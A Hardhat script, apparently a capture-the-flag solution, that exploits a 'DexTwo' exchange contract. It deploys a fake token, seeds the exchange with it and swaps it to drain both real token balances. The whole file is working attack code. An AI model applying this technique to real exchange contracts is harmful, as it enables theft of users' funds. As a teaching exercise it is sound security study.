const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x3486bA78742980e9bD73Dffc06C87c3fA5091A93";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Instance = await ethers.getContractFactory("DexTwo");
  const instance = Instance.attach(instanceAddress);

  const Contract = await ethers.getContractFactory("DexTwoAttack");
  const contract = await Contract.deploy();
  await contract.deployed();

  // Attack

  const TOKEN1 = await instance.token1();
  const TOKEN2 = await instance.token2();

  let tx;

  tx = await contract.mint(attacker.address, 300);
  await tx.wait();
  tx = await contract.approve(instanceAddress, 300);
  await tx.wait();

  tx = await contract.mint(instanceAddress, 100);
  await tx.wait();

  tx = await instance.swap(contract.address, TOKEN1, 100);
  await tx.wait();

  tx = await instance.swap(contract.address, TOKEN2, 200);
  await tx.wait();

  console.log(await instance.balanceOf(TOKEN1, instanceAddress));
  console.log(await instance.balanceOf(TOKEN2, instanceAddress));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
